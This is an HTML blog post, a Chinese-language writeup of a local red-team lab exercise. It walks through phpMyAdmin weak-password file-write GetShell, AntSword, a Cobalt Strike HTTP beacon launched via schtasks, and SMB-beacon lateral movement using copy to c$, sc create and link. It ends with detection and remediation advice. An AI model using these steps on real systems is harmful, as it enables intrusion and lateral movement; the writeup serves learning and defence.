@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>红日靶场 Writeup - gz2008的技术博客</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 40px 20px;
+            color: #1e293b;
+            background: #f6f9fc;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+            line-height: 1.8;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            padding: 40px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, .05);
+        }
+        .back-link { color: #2563eb; text-decoration: none; }
+        h1 {
+            margin: 20px 0;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #eef2f6;
+            color: #0f172a;
+            font-size: 2rem;
+            line-height: 1.35;
+        }
+        h2 {
+            margin-top: 34px;
+            padding-left: 10px;
+            border-left: 4px solid #3b82f6;
+            font-size: 1.4rem;
+        }
+        h3 { margin-top: 26px; color: #1d4ed8; font-size: 1.1rem; }
+        p, li { color: #475569; }
+        code {
+            padding: 2px 5px;
+            border-radius: 4px;
+            background: #f1f5f9;
+            color: #be123c;
+            overflow-wrap: anywhere;
+        }
+        pre {
+            padding: 15px;
+            border-radius: 6px;
+            background: #1e293b;
+            color: #e2e8f0;
+            overflow-x: auto;
+        }
+        pre code { padding: 0; background: none; color: inherit; }
+        table {
+            width: 100%;
+            margin: 18px 0;
+            border-collapse: collapse;
+            font-size: .94rem;
+        }
+        th, td {
+            padding: 10px 12px;
+            border: 1px solid #e2e8f0;
+            text-align: left;
+            vertical-align: top;
+        }
+        th { background: #eff6ff; color: #1e3a8a; }
+        .note {
+            margin: 18px 0;
+            padding: 12px 16px;
+            border-left: 4px solid #f97316;
+            background: #fff7ed;
+            color: #9a3412;
+        }
+        .success {
+            margin: 18px 0;
+            padding: 12px 16px;
+            border-left: 4px solid #22c55e;
+            background: #f0fdf4;
+            color: #166534;
+        }
+        figure { margin: 24px 0; }
+        figure img {
+            display: block;
+            width: 100%;
+            height: auto;
+            border: 1px solid #dbe3ee;
+            border-radius: 8px;
+        }
+        figcaption { margin-top: 8px; color: #64748b; font-size: .9rem; }
+        @media (max-width: 600px) {
+            body { padding: 0; }
+            .container { padding: 24px 18px; }
+            h1 { font-size: 1.65rem; }
+            table { display: block; overflow-x: auto; }
+        }
+    </style>
+</head>
+<body>
+<main class="container">
+    <a class="back-link" href="index.html">← 返回红日靶场首页</a>
+    <h1>红日靶场</h1>
+    <p>P1–P28 学习复盘：从 phpMyAdmin 到 SMB Beacon · 日期：2026-10-18</p>
+    <div class="note">
+        本文只记录本人本地授权靶场，不针对任何外部系统。发布稿已省略口令、Cookie、密钥、原始 WebShell 和与本实验无关的个人路径。
+    </div>
+
+    <h2>一、结论与证据范围</h2>
+    <p>
+        本轮完成的可验证终点是：边界机 STU1 通过 HTTP Beacon 上线，内网机 OWA 通过边界机建立 SMB 子会话。
+        没有取得域控会话，也没有用 OWA 的 <code>SYSTEM</code> 权限推导“已经控制域”。
+    </p>
+    <div class="success">
+        <strong>可复核材料：</strong>
+        Cobalt Strike 的 <code>events.log</code>、<code>beacon_*.log</code>、phpStudy 服务状态、AntSword/CS 现场截图，
+        以及 10 月 18 日保存的会话恢复记录。
+    </div>
+    <p>
+        P18–P19 的原始请求正文没有完整留存，因此下文的 SQL 是用于复现的最小等价步骤。
+        本地已确认弱默认口令可用并取得了执行通道，但不把未保存的请求正文写成逐字执行证据。
+        该靶场在本轮记录中没有 CTF flag，结果是会话与权限边界。
+    </p>
+
+    <h2>二、环境与网络</h2>
+    <table>
+        <thead>
+        <tr><th>角色</th><th>地址/主机</th><th>账号或状态</th><th>证据</th></tr>
+        </thead>
+        <tbody>
+        <tr><td>TeamServer</td><td>WSL <code>192.168.111.1:54321</code></td><td>Cobalt Strike</td><td>本地监听与会话日志</td></tr>
+        <tr><td>HTTP Listener</td><td><code>:8080</code></td><td><code>http-8080</code></td><td>Web 访问日志</td></tr>
+        <tr><td>边界机</td><td>STU1 <code>192.168.111.128</code></td><td><code>GOD\Administrator</code></td><td>beacon metadata</td></tr>
+        <tr><td>内网机</td><td>OWA <code>192.168.52.138</code></td><td><code>SYSTEM</code></td><td>SMB 子会话 metadata</td></tr>
+        <tr><td>主机虚拟网卡</td><td>VMnet1 <code>192.168.111.1/24</code></td><td>可访问 STU1</td><td>TCP 80/3389 检查</td></tr>
+        </tbody>
+    </table>
+    <p>
+        CS 界面中的 <code>169.254.129.186</code> 是虚拟机网卡枚举异常造成的显示值。
+        边界机的实际地址仍为 <code>192.168.111.128</code>，不能据此修改靶机原有的网络配置。
+    </p>
+
+    <h2>三、P1–P17：准备与入口确认</h2>
+    <p>
+        P1–P7 主要覆盖 HVV、红队职责、人员分工和学习路线；P8–P17 进入靶场环境、Win7 调试、
+        内网/域账号定位、信息收集、Web 漏洞和 WebShell 原理。本轮将它们归并为两个可检查条件：
+        入口 Web 服务可用，边界机能访问内网 OWA。
+    </p>
+    <pre><code>Test-NetConnection 192.168.111.128 -Port 80 -InformationLevel Quiet
+Test-NetConnection 192.168.111.128 -Port 3389 -InformationLevel Quiet</code></pre>
+    <p>两项检查均返回 <code>True</code>。HTTP 响应中记录的旧版组件为：</p>
+    <pre><code>Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</code></pre>
+    <p>
+        本地弱口令验证已经成功，但口令值不进入发布稿。这里必须区分：HTTP 200 只代表服务可达；
+        只有成功登录后的管理页面或认证成功标志，才能证明数据库账号可用。
+    </p>
+
+    <h2>四、P18–P19：phpMyAdmin GetShell</h2>
+    <h3>根因</h3>
+    <p>
+        高权限数据库账号不仅能读写业务数据，还能控制文件写入或全局日志位置。
+        当数据库进程对 Web 根目录有写权限时，SQL 能力就可能跨到 PHP 代码执行。
+    </p>
+    <pre><code>SELECT @@version, @@datadir, @@secure_file_priv;</code></pre>
+    <p>
+        先写入一个只返回固定标记的非破坏性测试文件。为避免在会话日志和发布页面中保存可直接复用的 WebShell，
+        下面用占位符代替可执行代码：
+    </p>
+    <pre><code>SELECT '&lt;LAB_PROBE_PHP&gt;'
+INTO OUTFILE 'C:/phpStudy/WWW/lab_probe.php';</code></pre>
+    <p>
+        <code>&lt;LAB_PROBE_PHP&gt;</code> 应替换为只返回固定标记、不含命令执行或外部回连的最小 PHP 测试内容。
+        访问对应 URL，看到固定标记才能说明数据库写权限变成了 Web 代码执行。
+        该路径受 <code>secure_file_priv</code>、目录权限和 MySQL 版本影响；失败时不能伪称成功。
+    </p>
+    <p>如果直接写文件被限制，课程 P19 的全局日志路径可以这样复现：</p>
+    <pre><code>SET GLOBAL general_log = 'OFF';
+SET GLOBAL general_log_file = 'C:/phpStudy/WWW/lab_probe.php';
+SET GLOBAL general_log = 'ON';
+SELECT '&lt;LAB_PROBE_PHP&gt;';
+SET GLOBAL general_log = 'OFF';</code></pre>
+    <p>
+        实际路径必须按靶场目录调整。日志文件会带时间和 SQL 前缀，PHP 遇到 PHP 开始标记后仍可执行其中的测试内容。
+        验证完成应关闭 <code>general_log</code> 并清理测试文件。
+    </p>
+
+    <h2>五、P20：AntSword 接管边界机</h2>
+    <p>
+        AntSword 的作用是把已确认的代码执行能力变成文件管理、虚拟终端和 payload 上传通道，
+        不是漏洞存在的证明。连接后先做最小检查：
+    </p>
+    <pre><code>whoami
+hostname
+ipconfig /all</code></pre>
+    <p>边界机最终返回的 CS 身份为：</p>
+    <pre><code>god\administrator</code></pre>
+    <p>发布稿不包含蚁剑连接口令、Cookie 或原始 WebShell 内容。</p>
+
+    <h2>六、P21–P24：3389 与内网条件</h2>
+    <p>
+        宿主机检查 <code>192.168.111.128:3389</code> 返回 <code>True</code>，但这只证明 TCP 端口可达，
+        不等同于已经完成 RDP 登录。本轮分别保留端口开放、账号定位和实际登录结果，不把前者扩写成后者。
+    </p>
+    <p>本地记录确认了内网横向所需的关键事实：</p>
+    <pre><code>owa.god.org -&gt; 192.168.52.138
+\\192.168.52.138\c$ 可访问</code></pre>
+    <p>
+        <code>ipconfig /all</code>、<code>whoami /all</code>、名称解析和 SMB 访问可以建立网络基线；
+        但真正证明横向条件的是后续文件复制、远程服务创建和 SMB 管道连接，而不是单次 ping。
+    </p>
+
+    <h2>七、P25–P27：HTTP Beacon 上线</h2>
+    <p>TeamServer 在本机 WSL 中监听 <code>54321</code>，HTTP listener 使用 <code>8080</code>：</p>
+    <pre><code>./TeamServerImage \
+  -Dcobaltstrike.server_port=54321 \
+  -Dcobaltstrike.server_bindto=0.0.0.0 \
+  -Djavax.net.ssl.keyStore=./cobaltstrike.store \
+  -Djavax.net.ssl.keyStorePassword=&lt;LabKeystorePassword&gt; \
+  -Duser.language=en \
+  teamserver 192.168.111.1 &lt;LabTeamServerPassword&gt;</code></pre>
+    <p>
+        边界 payload 通过蚁剑上传后启动。恢复现场使用计划任务，避开模拟 shell 对 <code>start</code> 支持不稳定的问题：
+    </p>
+    <pre><code>schtasks /create /tn csrun /tr "C:\phpStudy\WWW\artifact.exe" /sc once /st 23:59 /ru SYSTEM /f
+schtasks /run /tn csrun</code></pre>
+    <p>10 月 17 日实际观察到：</p>
+    <pre><code>GET /TZEj/ 200 277063
+computer: STU1
+user: Administrator
+process: artifact.exe
+pid: 2924
+os: Windows 6.1 build 7601 x64</code></pre>
+    <p>
+        stager <code>artifact.exe</code> 为 <code>19,456</code> 字节，拉取的 stage 为 <code>277,063</code> 字节。
+        会话建立后执行 <code>sleep 1</code> 与 <code>shell whoami</code>，输出 <code>god\administrator</code>。
+    </p>
+
+    <h2>八、P28：SMB Beacon 穿透不出网主机</h2>
+    <p>OWA 不能直接回连 TeamServer，因此由 STU1 作为父会话承载 SMB 子会话。</p>
+    <pre><code>upload /path/to/SMB.exe C:\phpStudy\WWW\SMB.exe
+shell copy SMB.exe \\192.168.52.138\c$</code></pre>
+    <p>本地实际输出：</p>
+    <pre><code>已复制         1 个文件。</code></pre>
+    <pre><code>shell sc \\owa.god.org create test binpath= "cmd.exe /c c:\SMB.exe"
+shell sc \\owa.god.org start test</code></pre>
+    <pre><code>[SC] CreateService 成功
+[SC] StartService 失败 1053:
+服务没有及时响应启动或控制请求。</code></pre>
+    <p>
+        <code>1053</code> 不是这里的最终失败。普通程序不是标准 Windows 服务，SCM 等不到服务握手会报错，
+        但进程仍可运行。随后直接连接命名管道：
+    </p>
+    <pre><code>link owa.god.org</code></pre>
+    <pre><code>Tasked to link to \\owa.god.org\pipe\&lt;pipe_name&gt;
+established link to child beacon: 192.168.52.138</code></pre>
+    <p>OWA 子会话 metadata：</p>
+    <pre><code>computer: OWA
+user: SYSTEM
+process: SMB.exe
+pid: 1292
+os: Windows 6.1 build 7601 x64</code></pre>
+    <p>P28 的交付目标是“不出网内网机通过边界机的 SMB 管道上线”，不是域控接管。</p>
+
+    <h2>九、现场结果</h2>
+    <figure>
+        <img src="assets/cobalt-strike-stu1-owa-2026-10-18.png" alt="Cobalt Strike 中 STU1 与 OWA 两条会话">
+        <figcaption>10 月 18 日恢复现场：STU1 使用 artifact.exe，OWA 使用 SMB.exe，监听器均为 http-8080。</figcaption>
+    </figure>
+
+    <h2>十、重启后的恢复</h2>
+    <ol>
+        <li>启动两台虚拟机，确认 STU1 的 80、3389 可达。</li>
+        <li>重新启动 TeamServer 和客户端。</li>
+        <li>通过蚁剑再次启动 <code>artifact.exe</code>，等待 STU1 上线。</li>
+        <li>执行 <code>shell sc \\owa.god.org start test</code>。</li>
+        <li>执行 <code>link owa.god.org</code>，确认新的 SMB 子会话。</li>
+    </ol>
+    <p>
+        Beacon 默认只在内存中存活，因此虚拟机重启后不会自动恢复。
+        10 月 18 日还把 phpStudy 的 Apache、MySQL 注册为 <code>AUTO_START</code>、<code>LocalSystem</code> 服务。
+        Apache 经过“杀掉原 httpd 后执行 <code>net start Apache2.4</code>”验证成功，phpMyAdmin 返回 HTTP 200；
+        MySQL 服务已注册，但没有写成已经完成同等运行验证。
+    </p>
+
+    <h2>十一、踩坑与判断</h2>
+    <table>
+        <thead>
+        <tr><th>现象</th><th>原因</th><th>处理</th></tr>
+        </thead>
+        <tbody>
+        <tr><td>重启后会话为 0</td><td>beacon 只活在内存中</td><td>重新运行 stager，再恢复 SMB link</td></tr>
+        <tr><td>蚁剑执行后终端无回显</td><td>前台 payload 阻塞 PHP 请求</td><td>重开终端，或改用计划任务</td></tr>
+        <tr><td><code>start</code> 只返回 <code>ret=1</code></td><td>模拟 shell 兼容性有限</td><td>使用 <code>schtasks</code></td></tr>
+        <tr><td>CS 窗口空白，拖拽后才显示</td><td>Java 与 WSLg/Swing 重绘问题</td><td>使用 Java 11 与固定 UI scale</td></tr>
+        <tr><td><code>sc start</code> 返回 <code>1053</code></td><td>普通程序不是标准服务</td><td>检查进程与 <code>link</code>，不只看 SCM 返回值</td></tr>
+        <tr><td>IP 列出现 <code>169.254.*</code></td><td>虚拟机网卡枚举异常</td><td>以实际边界网 <code>192.168.111.128</code> 为准</td></tr>
+        </tbody>
+    </table>
+
+    <h2>十二、检测与修复</h2>
+    <ul>
+        <li>删除 phpMyAdmin 默认或弱口令，禁止数据库账号从边界网直接登录。</li>
+        <li>使用最小权限数据库账号，关闭不必要的 <code>FILE</code> 能力和动态全局日志写入。</li>
+        <li>Web 根目录不应对数据库服务账号或普通应用账号可写。</li>
+        <li>限制 445 与 SMB 管理通道，监控远程服务创建和高权限服务账号变更。</li>
+        <li>升级 phpStudy、Apache、PHP 和 phpMyAdmin，移除不需要的管理入口。</li>
+        <li>监控异常 HTTP stager、短周期回连、SMB 命名管道和边界机发起的内网文件复制。</li>
+        <li>3389 应限制来源、使用强认证，并分别记录端口、认证和桌面登录结果。</li>
+    </ul>
+
+    <h2>十三、复盘</h2>
+    <pre><code>服务发现
+  -&gt; phpMyAdmin 弱口令
+  -&gt; SQL 写文件/日志 GetShell
+  -&gt; AntSword 控制边界机
+  -&gt; CS HTTP Beacon
+  -&gt; SMB Beacon 进入不出网内网机</code></pre>
+    <p>
+        每个箭头都需要独立证据：端口可达不等于登录成功，数据库报错不等于文件已写入，
+        <code>1053</code> 不等于 SMB 会话失败，<code>SYSTEM</code> 子会话也不等于域控失陷。
+    </p>
+</main>
+</body>
+</html>
